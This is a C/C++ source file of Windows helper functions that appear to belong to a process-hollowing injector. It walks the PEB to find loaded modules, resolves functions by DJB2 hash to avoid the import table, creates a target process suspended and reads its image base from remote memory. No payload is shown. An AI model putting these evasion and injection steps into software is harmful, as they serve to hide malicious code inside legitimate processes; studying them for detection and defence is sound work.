#include "Custom-Functions.h"
#include "Api-Hashing.h"
#include "Hash.h"

PPEB getPeb()
{
#if _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

// Problem of rights
HMODULE getModuleHandleCustom(LPWSTR name)
{
    PPEB peb = getPeb();
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY ent = listEntry->Flink;
    do
    {
        PLDR_DATA_TABLE_ENTRY tableEnt = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ent - 0x10);
        LPWSTR nameDll = (LPWSTR)*tableEnt->Reserved5;
        if (lstrcmpW(name, nameDll) == 0)
            return (HMODULE)tableEnt->DllBase;
        ent = ent->Flink;
    } while (ent != listEntry);

    return nullptr;
}

PVOID getProcAddressCustom(PVOID dllAddress, DWORD functionHash)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllAddress;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dllAddress + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeader->OptionalHeader;
    PIMAGE_DATA_DIRECTORY dataDir = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dllAddress + dataDir->VirtualAddress);

    PDWORD AddressOfFunctions = (PDWORD)((PBYTE)dllAddress + exportDir->AddressOfFunctions);
    PDWORD AddressOfNames = (PDWORD)((PBYTE)dllAddress + exportDir->AddressOfNames);
    PWORD AddressOfFunctionsOrdinals = (PWORD)((PBYTE)dllAddress + exportDir->AddressOfNameOrdinals);

    // Use absolute path for ofstream
    //std::ofstream outfile();
    for (int i = 0; i < exportDir->NumberOfFunctions; ++i)
    {
        PCSTR name = (PSTR)((PBYTE)dllAddress + AddressOfNames[i]);

        WORD ordinalName = (WORD)((PBYTE)dllAddress + AddressOfFunctionsOrdinals[i]);

        PVOID addr = (PVOID)((PBYTE)dllAddress + AddressOfFunctions[ordinalName]);
        //outfile << "#define " << name << "_HASH " << "0x" << DJB2hash(name) << std::endl;
        if (DJB2hash(name) == functionHash)
            return addr;
    }
    //outfile.close();
    return nullptr;
}

bool lauchSuspendProcess(LPSTR target, LPPROCESS_INFORMATION pi)
{
    LPSTARTUPINFOA si = new STARTUPINFOA();
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    printf("[*] Lauch suspend process...\n");
    if (!CreateProcessA(target, 0, 0, 0, false, CREATE_SUSPENDED, NULL, NULL, si, pi))
    {
        printf("ERROR: %x\r\n", GetLastError());
        return FALSE;
    }
    HANDLE hProcess = pi->hProcess;
    DWORD pid = GetProcessId(hProcess);
    printf("[+] Creating suspended process with PID : %u\r\n", pid);
    return TRUE;
}

bool getImageBaseAddr(LPVOID& destImageBase, HANDLE pHandle)
{
    LPCSTR nameNtDll = "ntdll.dll";
    PVOID ntDllAddr = GetModuleHandleA(nameNtDll);
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)getProcAddressCustom(ntDllAddr, NtQueryInformationProcess_HASH);
    if (!NtQueryInformationProcess) 
    {
        printf("[-] ERROR: Cannot find NtQueryInformationProcess.\n");
        return FALSE;
    }
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    PWORD returnLength = 0;
    DWORD NtStatus = 0;

    NtStatus = NtQueryInformationProcess(pHandle, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), returnLength);
    if (NtStatus != 0)
    {
        printf("[-] ERROR: Cannot get information on target process. ERROR code: %x\r\n", NtStatus);
        return FALSE;
    }

    DWORD64 imageBaseAddrOffset = (DWORD64)pbi->PebBaseAddress + 0x10;
    SIZE_T bytesRead = NULL;

    if (!ReadProcessMemory(pHandle, (LPCVOID)imageBaseAddrOffset, &destImageBase, sizeof(LPVOID), &bytesRead))
    {
        printf("[-] ERROR: Cannot read target process memory\r\n");
        return FALSE;
    }

    printf("[+] Getting image base address of target process: %p\r\n", destImageBase);
    return TRUE;
}

